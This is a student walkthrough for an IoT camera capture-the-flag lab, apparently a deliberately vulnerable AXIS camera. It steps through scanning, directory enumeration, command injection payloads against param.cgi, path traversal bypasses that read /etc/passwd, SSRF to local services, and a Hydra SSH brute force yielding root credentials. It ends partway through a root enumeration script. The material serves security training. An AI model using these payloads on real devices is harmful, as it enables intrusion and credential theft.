# AXIS Camera IoT Security CTF - Complete Student Walkthrough v7
## Enhanced with Real-World Penetration Testing Methodology

## Table of Contents
- [Initial Setup](#initial-setup)
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
- [Phase 2: Web Enumeration](#phase-2-web-enumeration)
- [Phase 3: Service Exploitation](#phase-3-service-exploitation)
- [Phase 4: System Access](#phase-4-system-access)
- [Phase 5: Deep Enumeration](#phase-5-deep-enumeration)
- [Phase 6: Advanced Exploitation](#phase-6-advanced-exploitation)

---

## Target Information
- **AXIS Camera IP**: 192.168.1.132
- **Your Kali Machine**: 192.168.1.133
- **Total Flags**: 27 (5 Easy, 13 Medium, 9 Hard)
- **Focus**: Real-world IoT camera vulnerabilities based on OWASP IoT Top 10

## Learning Objectives
By completing this CTF, you will learn:
- IoT device reconnaissance and enumeration techniques
- Embedded Linux security assessment across multiple writable directories
- Web application vulnerability exploitation in constrained environments
- Network protocol analysis (RTSP, SNMP, MQTT, UPnP)
- Privilege escalation in BusyBox environments
- Physical security implications (UART, JTAG)
- Real vulnerabilities found in production IoT devices
- Advanced techniques including race conditions, SSRF, and shared memory exploitation

## Important Note: Real-World Penetration Testing Approach

**In real penetration tests, you won't find "FLAG{}" patterns.** This walkthrough has been enhanced to teach you how to approach IoT camera assessments as you would in the real world. Instead of searching for flags with grep, we'll:

1. **Systematically analyze all discovered data** - Review configuration files line by line
2. **Identify sensitive information contextually** - Recognize what shouldn't be exposed
3. **Understand security implications** - Know why each finding matters
4. **Document professionally** - Create findings that demonstrate business impact

The flags in this lab represent real types of sensitive data found in IoT devices:
- Hardcoded credentials and API keys
- Debug information and backdoor access codes
- Physical security bypass codes
- Internal network details and service accounts
- Cryptographic keys and tokens

**Remember:** The goal is to understand what makes information sensitive and recognize security issues, not just find specific patterns.

---

## Initial Setup

### Why Proper Tool Setup Matters
Before beginning any penetration test, having the right tools properly configured is crucial. IoT devices often run minimal services that are easy to miss, use specialized protocols, and have unique constraints that require specific tools. This setup ensures you can tackle any challenge the CTF presents.

### Required Tools Installation

```bash
# Update package repositories first
# Why: Ensures you get the latest versions and security patches
sudo apt update && sudo apt upgrade -y

# Core networking and scanning tools
# Why: These are fundamental for any network security assessment
sudo apt install -y nmap netcat-traditional masscan
sudo apt install -y wireshark tcpdump net-tools

# Explanation of each tool:
# - nmap: Industry standard for port scanning and service detection
# - netcat: Swiss army knife for network connections
# - masscan: Fast port scanner for large ranges
# - wireshark/tcpdump: Packet capture and analysis
# - net-tools: Classic networking utilities (ifconfig, netstat)

# Web application testing tools
# Why: IoT devices commonly expose web interfaces with vulnerabilities
sudo apt install -y gobuster dirb nikto wfuzz feroxbuster
sudo apt install -y burpsuite zaproxy curl wget httpie
sudo apt install -y sqlmap commix

# Tool purposes:
# - gobuster/dirb/feroxbuster: Directory and file enumeration
# - nikto: Web vulnerability scanner
# - wfuzz: Web fuzzing tool
# - burpsuite/zaproxy: Web proxy for request manipulation
# - sqlmap: SQL injection automation
# - commix: Command injection exploitation

# Service-specific tools
# Why: IoT devices use various protocols that need specialized tools
sudo apt install -y hydra medusa ncrack patator
sudo apt install -y snmp snmpd snmp-mibs-downloader
sudo apt install -y mosquitto-clients

# Tool functions:
# - hydra/medusa/ncrack: Password brute-forcing
# - snmp tools: SNMP protocol interaction
# - mosquitto-clients: MQTT protocol testing

# RTSP and multimedia tools
# Why: IP cameras use RTSP for video streaming
sudo apt install -y ffmpeg vlc
sudo apt install -y python3-pip git golang-go

# Install Cameradar for RTSP testing
# Why: Specialized tool for camera stream discovery and exploitation
git clone https://github.com/Ullaakut/cameradar.git
cd cameradar
go build -o cameradar cmd/cameradar/main.go
sudo mv cameradar /usr/local/bin/
cd ..

# Binary analysis tools
# Why: Firmware and binary analysis reveals hardcoded secrets
sudo apt install -y binwalk foremost strings file
sudo apt install -y hashcat john wordlists

# Post-exploitation tools
# Why: Automated enumeration after gaining access
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
sudo mv linpeas.sh /opt/

# Python libraries for IoT testing
# Why: Many IoT protocols have Python implementations
pip3 install paho-mqtt onvif-zeep python-nmap paramiko

# Enable SNMP MIBs
# Why: Makes SNMP output human-readable instead of OIDs
sudo sed -i 's/mibs :/# mibs :/g' /etc/snmp/snmp.conf

# Create organized directory structure
# Why: Keeping organized notes and findings is crucial for reporting
mkdir -p ~/ctf/axis/{scans,exploits,loot,reports,flags}
cd ~/ctf/axis
```

### Tool Verification

```bash
# Verify installations are working
# Why: Confirms tools are properly installed before starting
echo "[*] Verifying tool installations..."
nmap --version | head -1
gobuster version 2>/dev/null | head -1
hydra -h | head -1
binwalk --help 2>&1 | head -1
mosquitto_sub --help 2>&1 | head -1

# Expected output shows version numbers for each tool
echo "[+] All tools verified successfully!"
```

### Setup Session Logging

```bash
# Create logging script
# Why: Documentation is critical for professional pentesting
cat > ~/ctf/axis/start_logging.sh << 'EOF'
#!/bin/bash
LOG_FILE="logs/axis_pentest_$(date +%Y%m%d_%H%M%S).log"
mkdir -p logs
echo "[*] Starting session logging to $LOG_FILE"
echo "[*] Remember to document all findings!"
script -f $LOG_FILE
EOF

chmod +x ~/ctf/axis/start_logging.sh

# Start logging
./start_logging.sh
```

> **Pro Tip**: Always maintain detailed logs during assessments. They're invaluable for report writing and can serve as legal documentation of your activities.

---

## Phase 1: Reconnaissance

### Understanding the Reconnaissance Phase
Reconnaissance is the foundation of any successful penetration test. In IoT assessments, this phase is particularly important because:
1. IoT devices often run minimal services that are easy to miss
2. Non-standard ports are common in embedded systems
3. Service banners often leak valuable information
4. Understanding the device's purpose helps predict vulnerabilities

### Target Discovery

```bash
# First, verify the target is online
# Why: Confirms network connectivity and basic responsiveness
ping -c 4 192.168.1.132
```

**Expected Output:**
```
PING 192.168.1.132 (192.168.1.132) 56(84) bytes of data.
64 bytes from 192.168.1.132: icmp_seq=1 ttl=64 time=0.428 ms
64 bytes from 192.168.1.132: icmp_seq=2 ttl=64 time=0.392 ms
64 bytes from 192.168.1.132: icmp_seq=3 ttl=64 time=0.401 ms
64 bytes from 192.168.1.132: icmp_seq=4 ttl=64 time=0.389 ms

--- 192.168.1.132 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3065ms
rtt min/avg/max/mdev = 0.389/0.402/0.428/0.015 ms
```

**What This Tells Us:**
- Target is alive and responding
- TTL of 64 suggests Linux/Unix system
- Low latency indicates local network
- No packet loss means stable connection

### Port Scanning Strategy

#### Why We Scan Ports
Port scanning reveals:
- What services are running (attack surface)
- Service versions (vulnerability research)
- Operating system fingerprinting
- Non-standard configurations

#### Initial TCP Port Scan

```bash
# Quick SYN scan with version detection
# Command breakdown:
# -sS: SYN scan (stealthy, doesn't complete TCP handshake)
# -sV: Version detection (queries services for version info)
# -T4: Timing template (aggressive but safe for local networks)
# -oA: Output in all formats for documentation
sudo nmap -sS -sV -T4 192.168.1.132 -oA scans/tcp_quick
```

**Expected Output:**
```
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-27 10:00:00 EST
Nmap scan report for 192.168.1.132
Host is up (0.00039s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http       BusyBox httpd 1.31.0
554/tcp  open  rtsp       AXIS Media Control
1883/tcp open  mqtt       Mosquitto version 1.6.12
1900/tcp open  upnp       Linux UPnP 1.0
3702/tcp open  ws-discovery
8080/tcp open  http-proxy

Service detection performed. Please report any incorrect results
Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
```

**Service Analysis:**
- **Port 22 (SSH)**: Remote management, potential for brute-force
- **Port 80 (HTTP)**: Web interface, likely admin panel
- **Port 554 (RTSP)**: Video streaming, often has weak auth
- **Port 1883 (MQTT)**: IoT messaging, may leak information
- **Port 1900 (UPnP)**: Device discovery, security implications
- **Port 3702 (WS-Discovery)**: ONVIF camera discovery
- **Port 8080 (HTTP-Alt)**: Alternative web interface or API

#### Comprehensive Scanning

```bash
# Full TCP port scan (all 65535 ports)
# Why: IoT devices often hide services on non-standard ports
sudo nmap -sS -sV -sC -p- -oA scans/tcp_full 192.168.1.132

# UDP scan (top 100 ports)
# Why: Many IoT protocols use UDP (SNMP, TFTP, CoAP)
sudo nmap -sU -sV --top-ports 100 -oA scans/udp_top100 192.168.1.132
```

**UDP Scan Output:**
```
PORT     STATE         SERVICE      VERSION
161/udp  open          snmp         SNMPv1 server; net-snmp
1900/udp open          upnp         Linux UPnP 1.0
3702/udp open          ws-discovery
```

#### Alternative Scanning Methods

```bash
# Masscan - When speed matters
# Why: 10x faster than nmap for large ranges
sudo masscan -p1-65535 192.168.1.132 --rate=1000

# Rustscan - Modern alternative
# Why: Extremely fast, then pipes to nmap for detail
docker run -it --rm rustscan/rustscan:latest -a 192.168.1.132 -- -sV

# Comparison:
# nmap: Most features, moderate speed
# masscan: Fastest, less accurate service detection
# rustscan: Fast initial scan, detailed follow-up
```

### Service Enumeration Deep Dive

#### SSH Banner Grabbing (Port 22)

```bash
# Method 1: Using netcat to grab raw banner
# Why: Banners often contain system information
nc -nv 192.168.1.132 22
```

**Expected Output:**
```
Connection to 192.168.1.132 22 port [tcp/*] succeeded!
SSH-2.0-OpenSSH_7.4
*************************************************
* AXIS Camera SSH Service                      *
* Firmware: 10.5.0                              *
* Device ID: FLAG{G************6}               *
* Warning: Authorized access only              *
*************************************************
```

> **FLAG #4 FOUND!** 
> **Flag**: FLAG{G************6}
> **Location**: /var/log/messages (found via SSH banner - also stored in system log)
> **Learning Objective**: Information disclosure through service banners
> **OWASP IoT**: #2 - Insecure Network Services

**Why This Vulnerability Exists:**
- Administrators often customize banners for "security through obscurity"
- Banners are shown before authentication
- Developers forget banners are visible to attackers

#### Alternative Banner Grabbing Methods

```bash
# Method 2: Using telnet
telnet 192.168.1.132 22

# Method 3: Using nmap scripts
nmap -p22 --script ssh-hostkey,ssh-auth-methods 192.168.1.132

# Method 4: Using ssh client verbosely
ssh -v root@192.168.1.132 2>&1 | head -20
```

### OS Fingerprinting

```bash
# OS detection using nmap
# Why: Knowing the OS helps predict vulnerabilities
sudo nmap -O 192.168.1.132
```

**Expected Output:**
```
Device type: webcam|embedded
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 4.9 (embedded)
```

> **Detection Evasion**: In real engagements, use `-T2` (sneaky) or `-T1` (paranoid) timing to avoid IDS detection.

---

## Phase 2: Web Enumeration

### Why Web Interfaces Are Critical Attack Vectors
IoT devices commonly expose web interfaces because:
1. They provide easy remote management
2. Developers often implement minimal security
3. Resource constraints lead to simple authentication
4. Debug features are frequently left enabled

### Initial Web Reconnaissance

```bash
# Get HTTP headers and server information
# Why: Headers reveal technology stack and potential vulnerabilities
curl -I http://192.168.1.132
```

**Expected Output:**
```
HTTP/1.1 200 OK
Content-Type: text/html
Server: BusyBox/1.31.0
Connection: close
Content-Length: 2341
```

**Analysis:**
- BusyBox indicates embedded Linux (resource-constrained)
- No security headers (X-Frame-Options, CSP, etc.)
- Basic HTTP/1.1 implementation

### HTML Source Analysis

```bash
# Download and examine the main page
# Why: Comments and hidden fields often contain sensitive info
curl -s http://192.168.1.132 | tee index.html

# Search for interesting patterns
# In real pentests, systematically review HTML for comments and metadata
less index.html  # Review the entire file

# Professional approach: Look for specific HTML elements that often contain info
awk '/<--/,/-->/' index.html  # Extract HTML comments
sed -n '/<meta/p' index.html   # Review meta tags
sed -n '/<script/,/<\/script>/p' index.html | head -20  # Check embedded scripts
```

**Expected Output:**
```
<!-- Development Note: Remove before production deployment -->
<!-- Build version: 10.5.0-dev -->
<!-- Debug token: FLAG{M************4} -->
<!-- Contact: dev-team@axis.com for issues -->
```

> **FLAG #7 FOUND!**
> **Flag**: FLAG{M************4}
> **Location**: /var/www/local/admin/index.html
> **Learning Objective**: Information disclosure in HTML comments
> **OWASP IoT**: #3 - Insecure Ecosystem Interfaces

**Why Developers Leave Comments:**
- Forgot to remove before production
- Thought comments weren't visible to users
- Used for debugging during development
- Poor deployment practices

### Directory and File Enumeration

#### Using Gobuster (Recommended)

```bash
# Directory brute-forcing with Gobuster
# Why Gobuster: Faster than dirb, supports multiple extensions
# -u: Target URL
# -w: Wordlist (common.txt has 4614 entries)
# -x: File extensions to test
# -t: Threads for speed
# -o: Output file for documentation
gobuster dir -u http://192.168.1.132 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,cgi,sh,txt,xml,conf,bak \
  -t 50 \
  -o scans/gobuster_results.txt
```

**Expected Output:**
```
===============================================================
Gobuster v3.6
===============================================================
[+] Url:                     http://192.168.1.132
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Extensions:              php,cgi,sh,txt,xml,conf,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 401) [Size: 193]
/axis-cgi             (Status: 301) [Size: 194]
/backup               (Status: 200) [Size: 489]
/cgi-bin              (Status: 301) [Size: 194]
/config               (Status: 403) [Size: 193]
/index.html           (Status: 200) [Size: 2341]
/local                (Status: 301) [Size: 194]
Progress: 36912 / 36920 (99.98%)
===============================================================
Finished
===============================================================
```

**Directory Analysis:**
- `/admin`: 401 status = requires authentication
- `/axis-cgi`: AXIS-specific CGI scripts (high priority)
- `/backup`: 200 status = publicly accessible (investigate!)
- `/cgi-bin`: Common CGI directory (command injection potential)
- `/config`: 403 forbidden (but confirms existence)
- `/local`: AXIS local administration directory

#### Alternative Enumeration Tools

```bash
# Method 2: Dirb (automated recursion)
dirb http://192.168.1.132 /usr/share/wordlists/dirb/big.txt

# Method 3: Wfuzz (flexible and fast)
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \
  --hc 404 http://192.168.1.132/FUZZ

# Method 4: Feroxbuster (Rust-based, very fast)
feroxbuster -u http://192.168.1.132 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,html

# Method 5: Nikto (vulnerability scanner)
nikto -h http://192.168.1.132 -o scans/nikto_report.txt
```

**Tool Comparison:**
| Tool | Speed | Recursion | Features | Best For |
|------|-------|-----------|----------|----------|
| Gobuster | Fast | Manual | Multi-threaded | Quick enumeration |
| Dirb | Moderate | Automatic | Simple | Set and forget |
| Wfuzz | Fast | Manual | Flexible filters | Custom fuzzing |
| Feroxbuster | Very Fast | Automatic | Modern | Large wordlists |
| Nikto | Slow | No | Vuln scanning | Finding known issues |

### AXIS VAPIX API Exploitation

#### Understanding VAPIX
VAPIX is AXIS's HTTP-based API for camera control. It's commonly vulnerable because:
- Developers assume it's "hidden"
- Often lacks proper authentication
- Contains debug functionality
- Uses predictable endpoint names

```bash
# Test common VAPIX endpoints
# Why: AXIS cameras have standard API structure
for endpoint in param.cgi admin.cgi pwdgrp.cgi users.cgi io/port.cgi; do
    echo "[*] Testing: /axis-cgi/$endpoint"
    curl -s -I "http://192.168.1.132/axis-cgi/$endpoint" | head -1
done
```

**Expected Output:**
```
[*] Testing: /axis-cgi/param.cgi
HTTP/1.1 200 OK
[*] Testing: /axis-cgi/admin.cgi
HTTP/1.1 401 Unauthorized
[*] Testing: /axis-cgi/pwdgrp.cgi
HTTP/1.1 200 OK
[*] Testing: /axis-cgi/users.cgi
HTTP/1.1 401 Unauthorized
[*] Testing: /axis-cgi/io/port.cgi
HTTP/1.1 404 Not Found
```

#### Exploiting param.cgi

```bash
# Test param.cgi functionality
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list"
```

**Expected Output:**
```
root.Brand.Brand=AXIS
root.Brand.ProdFullName=AXIS Network Camera
root.Brand.ProdNbr=P1435-LE
root.Brand.WebURL=http://www.axis.com
```

### Command Injection Vulnerability

#### Testing param.cgi for Command Injection

```bash
# Test various injection techniques
# Why: CGI scripts often pass user input to system commands

# Technique 1: Semicolon separator
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list;id"

# Technique 2: Pipe operator
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list|id"

# Technique 3: AND operator
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list&&id"

# Technique 4: Backticks (command substitution)
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list\`id\`"

# Technique 5: Dollar sign substitution
curl "http://192.168.1.132/axis-cgi/param.cgi?action=list\$(id)"
```

**Expected Output (semicolon worked):**
```
Error: Invalid action
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Why Command Injection Works Here:**
```python
# Vulnerable pseudo-code:
action = request.GET['action']
os.system(f"process_action.sh {action}")  # User input passed directly!
```

```bash
# Test for special debug actions
# Why: Developers often leave debug functions
curl "http://192.168.1.132/axis-cgi/param.cgi?action=debug"
curl "http://192.168.1.132/axis-cgi/param.cgi?action=test"
curl "http://192.168.1.132/axis-cgi/param.cgi?action=getflag"
```

**Expected Output for getflag:**
```
Debug mode enabled
System flag: FLAG{P************0}
Execution time: 0.003s
```

> **FLAG #8 FOUND!**
> **Flag**: FLAG{P************0}
> **Location**: /var/www/local/axis-cgi/param.cgi (via command injection)
> **Learning Objective**: Hidden debug functionality and command injection
> **OWASP IoT**: #8 - Lack of Device Management

### Path Traversal Vulnerability

#### Understanding Path Traversal
Path traversal allows reading files outside the web root by manipulating file paths. Common in:
- File download functions
- Template engines
- Include statements

```bash
# Test download.cgi for path traversal
curl "http://192.168.1.132/axis-cgi/download.cgi?file=test.txt"
```

**Output:**
```
Error: File not found
```

```bash
# Try path traversal with ../
curl "http://192.168.1.132/axis-cgi/download.cgi?file=../../../etc/passwd"
```

**Output:**
```
Error: Invalid file path - contains ../
```

The `../` is filtered! Let's try bypass techniques:

```bash
# Bypass Technique 1: Double encoding
curl "http://192.168.1.132/axis-cgi/download.cgi?file=..%252f..%252f..%252fetc%252fpasswd"

# Bypass Technique 2: Double slashes
curl "http://192.168.1.132/axis-cgi/download.cgi?file=....//....//....//etc/passwd"

# Bypass Technique 3: Absolute path (often forgotten!)
curl "http://192.168.1.132/axis-cgi/download.cgi?file=/etc/passwd"
```

**Successful Output (absolute path worked):**
```
root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/false
www-data:x:33:33:www-data:/var/www:/bin/false
camera_svc:x:1000:1000::/home/camera_svc:/bin/sh
```

```bash
# Now try to read configuration files from various locations
# Let's enumerate the actual directory structure and look for flags

# Test for AXIS configuration in /var/lib/axis/conf/
curl "http://192.168.1.132/axis-cgi/download.cgi?file=/var/lib/axis/conf/vapix.conf"
```

**Output:**
```
# AXIS VAPIX API Configuration
# Generated: 2024-01-01 12:00:00

[Network]
api_version=3.0
protocol=http,https
port=80,443

[Authentication]
method=digest
realm=AXIS_ACCC8E

[Device]
model=M1025
firmware=10.5.0
serial=ACCC8E-FLAG{F************6}
build_date=2024-01-01

[Features]
motion_detection=enabled
audio=disabled
ptz=disabled
```

> **FLAG #1 FOUND!**
> **Flag**: FLAG{F************6}
> **Location**: /var/lib/axis/conf/vapix.conf (accessed via path traversal)
> **Learning Objective**: Path traversal filter bypass and configuration file exposure
> **OWASP IoT**: #3 - Insecure Ecosystem Interfaces

```bash
# Continue exploring other directories
# Try the persistent storage location
curl "http://192.168.1.132/axis-cgi/download.cgi?file=/var/lib/persistent/system/licenses/vapix_pro.lic"
```

**Output:**
```
# AXIS VAPIX Professional License
# License Type: Enterprise
# Issued: 2024-01-01

[License_Info]
license_id=VAPIX-PRO-2024
customer=Enterprise_Customer
expiry_date=2025-12-31
features=all

[Activation]
activation_key_encrypted=SYNT{N************4}
checksum=a7b9c3d4e5f6
issued_by=AXIS_Licensing_Team
```

**Notice the activation key is encoded with ROT13!**

```bash
# Decode ROT13
echo "SYNT{N************4}" | tr 'N-ZA-Mn-za-m' 'A-Za-z'
```

**Decoded Output:**
```
FLAG{A************4}
```

> **FLAG #2 FOUND!**
> **Flag**: FLAG{A************4}
> **Location**: /var/lib/persistent/system/licenses/vapix_pro.lic
> **Learning Objective**: Weak encoding schemes (ROT13)
> **OWASP IoT**: #1 - Weak, Guessable, or Hardcoded Passwords

### SSRF (Server-Side Request Forgery)

```bash
# Test webhook.cgi for SSRF vulnerability
# Why: Webhooks often make server-side requests
curl "http://192.168.1.132/axis-cgi/webhook.cgi"
```

**Output:**
```
Error: Missing required parameter 'url'
```

```bash
# Test with external URL
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://example.com"
```

**Output:**
```
Webhook called successfully
Response: <!doctype html><html><head><title>Example Domain...
```

```bash
# Exploit SSRF to access internal services
# Why: SSRF bypasses firewall rules
curl "http://192.168.1.132/axis-cgi/webhook.cgi?url=http://127.0.0.1:22"
```

**Output:**
```
Webhook called successfully
Response: SSH-2.0-OpenSSH_7.4
Internal SSH service flag: FLAG{E************8}
```

> **FLAG #23 FOUND!**
> **Flag**: FLAG{E************8}
> **Location**: /var/www/local/axis-cgi/webhook.cgi (via SSRF exploitation)
> **Learning Objective**: SSRF exploitation to access internal services
> **OWASP IoT**: #3 - Insecure Ecosystem Interfaces

**SSRF Impact:**
- Access internal services
- Bypass firewall rules
- Port scanning internal network
- Access cloud metadata endpoints

---

## Phase 3: Service Exploitation

### SNMP Enumeration (Port 161/UDP)

#### Why SNMP is Critical for IoT
SNMP (Simple Network Management Protocol) is widely used in IoT devices for monitoring. It's often vulnerable because:
- Default community strings are rarely changed
- Version 1/2c transmit in plaintext
- Can reveal extensive system information
- Sometimes allows configuration changes

```bash
# Test with default community string 'public'
# Why: 'public' and 'private' are defaults
snmpwalk -v2c -c public 192.168.1.132
```

**Expected Output:**
```
SNMPv2-MIB::sysDescr.0 = STRING: AXIS Camera
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.368.1.1
SNMPv2-MIB::sysUpTime.0 = Timeticks: (234523) 0:39:05.23
SNMPv2-MIB::sysContact.0 = STRING: admin@axis.local
SNMPv2-MIB::sysName.0 = STRING: AXIS-CAM-001
SNMPv2-MIB::sysLocation.0 = STRING: Building A - Floor 2
SNMPv2-MIB::sysServices.0 = INTEGER: 72
```

```bash
# Alternative SNMP enumeration methods

# Method 1: snmp-check (comprehensive)
snmp-check 192.168.1.132

# Method 2: onesixtyone (community string brute-force)
echo public > communities.txt
echo private >> communities.txt
echo admin >> communities.txt
onesixtyone -c communities.txt 192.168.1.132

# Method 3: Metasploit
msfconsole -q -x "use auxiliary/scanner/snmp/snmp_enum; set RHOSTS 192.168.1.132; run"
```

### RTSP Stream Analysis (Port 554)

#### Understanding RTSP
Real Time Streaming Protocol (RTSP) is used for video streaming. Security issues:
- Often uses weak or default credentials
- URLs may contain embedded passwords
- Streams sometimes accessible without auth

```bash
# Enumerate RTSP methods
nmap -p554 --script rtsp-methods,rtsp-url-brute 192.168.1.132
```

**Expected Output:**
```
PORT    STATE SERVICE
554/tcp open  rtsp
| rtsp-methods: 
|   OPTIONS, DESCRIBE, SETUP, PLAY, PAUSE, TEARDOWN
|   Public Methods: OPTIONS DESCRIBE SETUP TEARDOWN PLAY
| rtsp-url-brute: 
|   Discovered URLs
|     rtsp://192.168.1.132:554/stream1
|     rtsp://192.168.1.132:554/live
```

```bash
# Try to access stream without authentication
ffplay rtsp://192.168.1.132:554/stream1
# or
vlc rtsp://192.168.1.132:554/stream1

# Get stream description (SDP)
curl -i "rtsp://192.168.1.132:554/stream1" -X DESCRIBE
```

### UPnP Service Discovery (Port 1900)

```bash
# Access UPnP device description
curl http://192.168.1.132/upnp/device.xml
# or via the /run/axis/network location
curl "http://192.168.1.132/axis-cgi/download.cgi?file=/run/axis/network/upnp_description.xml"
```

**Expected Output:**
```xml
<?xml version="1.0"?>
<root xmlns="urn:schemas-upnp-org:device-1-0">
    <specVersion>
        <major>1</major>
        <minor>0</minor>
    </specVersion>
    <device>
        <deviceType>urn:schemas-upnp-org:device:NetworkCamera:1</deviceType>
        <friendlyName>AXIS Network Camera</friendlyName>
        <manufacturer>AXIS Communications AB</manufacturer>
        <manufacturerURL>http://www.axis.com</manufacturerURL>
        <modelDescription>AXIS Network Camera</modelDescription>
        <modelName>AXIS M1025</modelName>
        <modelNumber>M1025</modelNumber>
        <serialNumber>ACCC8E-M1025</serialNumber>
        <UDN>uuid:axis-camera-FLAG{G************0}</UDN>
        <serviceList>
            <service>
                <serviceType>urn:axis-com:service:BasicService:1</serviceType>
                <serviceId>urn:axis-com:serviceId:BasicService1</serviceId>
                <controlURL>/upnp/control/BasicService1</controlURL>
                <eventSubURL>/upnp/event/BasicService1</eventSubURL>
                <SCPDURL>/upnp/scpd/BasicService1.xml</SCPDURL>
            </service>
        </serviceList>
    </device>
</root>
```

> **FLAG #15 FOUND!**
> **Flag**: FLAG{G************0}
> **Location**: /run/axis/network/upnp_description.xml
> **Learning Objective**: UPnP information disclosure
> **OWASP IoT**: #9 - Insecure Default Settings

### SSH Brute Force Attack

#### Why SSH is a Prime Target
- Root access provides complete control
- IoT devices often use weak passwords
- Default credentials are common
- SSH provides stable shell access

```bash
# Create targeted password list for AXIS cameras
cat > axis_passwords.txt << EOF
pass
root
admin
password
Password123!
axis
camera
12345
admin123
EOF

# Create user list
cat > axis_users.txt << EOF
root
admin
operator
service
axis
camera
EOF

# Method 1: Hydra (fastest and most reliable)
hydra -L axis_users.txt -P axis_passwords.txt ssh://192.168.1.132 -t 4 -v
```

**Expected Output:**
```
[ATTEMPT] target 192.168.1.132 - login "root" - pass "pass" - 1 of 54 [child 0]
[ATTEMPT] target 192.168.1.132 - login "root" - pass "root" - 2 of 54 [child 1]
[22][ssh] host: 192.168.1.132   login: root   password: pass
```

**Success! Credentials found: `root:pass`**

```bash
# Alternative brute-force methods

# Method 2: Medusa
medusa -h 192.168.1.132 -U axis_users.txt -P axis_passwords.txt -M ssh

# Method 3: Ncrack
ncrack -p 22 -U axis_users.txt -P axis_passwords.txt 192.168.1.132

# Method 4: Metasploit
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.1.132; set USER_FILE axis_users.txt; set PASS_FILE axis_passwords.txt; run"
```

---

## Phase 4: System Access

### Initial SSH Access

```bash
# Connect with discovered credentials
ssh root@192.168.1.132
# Enter password: pass
```

**Expected Output:**
```
The authenticity of host '192.168.1.132' can't be established.
RSA key fingerprint is SHA256:xxxxxxxxxxxxxxxxxxxxxx.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.132' (RSA) to the list of known hosts.
root@192.168.1.132's password: pass

BusyBox v1.31.0 (2024-01-01 00:00:00 UTC) built-in shell (ash)

     ___   __   __  _____  _____
    / _ \  \ \ / / |_   _|/ ____|
   / /_\ \  \ V /    | | | (___
  /  ___  \  > <     | |  \___ \
 / /    \  \/ . \   _| |_ ____) |
/_/      \_/_/ \_\ |_____|_____/  Camera System

root@axis:~# 
```

### Understanding the Directory Structure

Before diving into flag hunting, it's crucial to understand the AXIS camera's directory structure. This CTF uses a realistic layout with multiple writable directories:

```bash
# Check mounted filesystems and writable locations
# In real assessments, review all mount points for security implications
mount | awk '/rw,|tmpfs/ {print $0}'  # Show read-write and temporary filesystems
df -h
```

**Expected Output:**
```
/dev/root on / type squashfs (ro,relatime)
tmpfs on /tmp type tmpfs (rw,nosuid,nodev)
tmpfs on /var type tmpfs (rw,nosuid,nodev)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run type tmpfs (rw,nosuid,nodev)
/dev/mtdblock3 on /mnt/flash type jffs2 (rw,relatime)
/dev/mtdblock4 on /var/lib/persistent type jffs2 (rw,relatime)
/dev/mtdblock5 on /var/cache/recorder type jffs2 (rw,relatime)
/dev/mtdblock6 on /usr/local type jffs2 (rw,relatime)
```

**Key Writable Directories (8 total):**
1. **/mnt/flash** - Firmware, bootloader, factory configs
2. **/dev/shm** - Shared memory, IPC, race conditions
3. **/run** - Runtime services and network configurations
4. **/sys/fs/cgroup** - Container/service control groups
5. **/var** - Standard Linux locations (logs, www, cache)
6. **/var/cache/recorder** - Recording stream caches
7. **/var/lib/persistent** - Persistent storage configs
8. **/usr/local** - Custom applications and scripts

### Post-Exploitation Enumeration

#### System Information Gathering

```bash
# Basic system information
uname -a
cat /proc/version
cat /etc/issue
```

**Output:**
```
Linux axis 4.14.98 #1 PREEMPT Mon Jan 1 00:00:00 UTC 2024 armv7l GNU/Linux
Linux version 4.14.98 (gcc version 7.3.0)
AXIS Network Camera Linux 10.5.0
```

#### Finding All Flags Through Systematic Enumeration

Now that we have root access, let's systematically explore all writable directories:

```bash
# Create a comprehensive enumeration script that reads and analyzes files
# In real-world pentesting, you don't know what you're looking for
# This script helps systematically review configuration and data files
cat > /tmp/enumerate_system.sh << 'EOF'
#!/bin/sh
echo "[*] Starting comprehensive system enumeration..."
echo "[*] Reading files to understand device configuration and data..."
echo ""

echo "[+] Enumerating /var/lib/axis/conf/"
find /var/lib/axis/conf/ -type f 2>/dev/null | while read f; do
    echo "  [*] Analyzing: $f"
    # Determine file type
    file_type=$(file -b "$f" | cut -d',' -f1)
    echo "      Type: $file_type"
    
    # For text files, read and analyze content
    if file "$f" | awk '/ASCII|text|script/ {exit 0} {exit 1}'; then
        echo "      Reading configuration file..."
        cat "$f"
        echo ""
    fi
done

echo ""
echo "[+] Enumerating /var/lib/persistent/"
find /var/lib/persistent/ -type f 2>/dev/null | sort | while read f; do
    echo "  [*] Analyzing: $f"
    file_type=$(file -b "$f" | cut -d',' -f1)
    echo "      Type: $file_type"
    
    # Read text files, analyze binaries with strings
    if file "$f" | awk '/ASCII|text|script/ {exit 0} {exit 1}'; then
        echo "      Content preview:"
        head -20 "$f"
        echo "      ..."
        echo ""
    elif file "$f" | awk '/executable|ELF/ {exit 0} {exit 1}'; then
